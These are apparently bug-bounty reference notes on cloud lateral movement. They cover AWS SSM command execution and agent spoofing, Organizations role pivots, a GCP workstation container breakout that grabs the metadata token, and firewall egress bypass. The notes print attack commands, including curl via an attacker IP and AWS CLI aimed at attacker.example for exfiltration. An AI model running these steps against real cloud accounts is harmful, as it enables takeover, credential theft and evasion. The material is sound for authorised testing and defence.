# Ch6: Lateral Movement — SSM, Console, Organizations, Containers

Source: `aws/post_exploitation/` (run_shell_commands_on_ec2, intercept_ssm_communications, create_a_console_session, get_iam_creds_from_console_session, role-chain-juggling, codebuild_github_runner, network-firewall-egress-bypass), `aws/general-knowledge/` (aws_organizations_defaults, connection-tracking), `azure/run-command-abuse.md`, `gcp/exploitation/gcp-cloud-workstations-container-breakout.md`. With one set of creds, which other hosts/accounts become reachable? Relevant when a program grants credentialed access or leaked keys land in scope.

## Command execution on compute

- **SSM SendCommand** — `aws ssm send-command --instance-ids i-x --document-name AWS-RunShellScript --parameters commands="id"`; fetch output via `ssm:ListCommandInvocations --command-id <id> --details`. Command strings show as `HIDDEN_DUE_TO_SECURITY_REASONS` in CloudTrail (host logging only). `ssm:StartSession` = interactive shell. No `AWS-Run*ShellScript` doc allowed? Other public documents may work (fun-with-ssm); EC2StepShell wraps send-command into a shell loop on public or private instances.
- **SSM agent spoofing** — with an instance's role creds you can impersonate the agent: intercept EC2 Messages (fake "Success" responses) or spawn your own control-channel WebSocket to hijack incoming sessions/commands.
- **Azure Run Command** — `runCommands/action` permission → arbitrary script as SYSTEM/root through portal/CLI/PS (ch05).
- **GCP Cloud Workstations** — mounted `/var/run/docker.sock` → `docker run --privileged --net=host --pid=host -v /:/mnt/host alpine` → `chroot /mnt/host` → host GCE VM → `169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` = project service account.

## Account & console pivots

- **Organizations pivot** — every Org-created member account has `OrganizationAccountAccessRole` with `AdministratorAccess`, trusting the management account ID: one management-account foothold → assume-role into every member. Invited accounts only have the role if it was created. Service-linked role enum (ch01) reveals membership.
- **Keys ↔ console** — `aws-vault login` converts creds to a console session; CloudShell `localhost:1338` converts console back to creds (ch02/ch03). Console use is loud (`ConsoleLogin`, odd user-agent).
- **Role-chain juggling** — hop AssumeRole across trust-connected roles to keep creds fresh and shift identity (ch03).
- **CodeBuild GitHub runner** — backdoored role trust (`codebuild.amazonaws.com`) + attacker-controlled repo + workflow → recurring role creds delivered into GitHub Actions.

## Network-layer slips

- **Connection tracking** — established flows survive a security-group lockdown: a reverse shell opened *before* the defender swaps to a deny-all SG keeps working (untracked SGs can be toggled to break it). Include as IR-evasion evidence in reports; defenders should prefer NACL isolation or untracked mode.
- **Network Firewall egress bypass** — domain-list rules match SNI/Host only, no DNS check: `curl -ik https://allowed.example --resolve 'allowed.example:443:<your-ip>'` or `-H "Host: allowed.example" http://<your-ip>` reaches attacker infra through an allowlist. Mitigation = TLS inspection (HTTPS only; HTTP stays open).
- **AWS CLI as LOLScript** — `aws s3 ls --endpoint-url https://attacker.example` talks to any S3-compatible store (MinIO) — exfil/tool-download channel that looks like normal AWS CLI in host logs (SCARLETEEL TTP).

**Bounty-safe validation**: lateral-movement proof = permission evidence, not execution. `ssm:SendCommand` availability can be shown by `aws ssm describe-instance-information` + policy listing rather than running commands on production hosts. If execution is in scope, a benign `id`/`hostname` on a designated test instance is the ceiling.
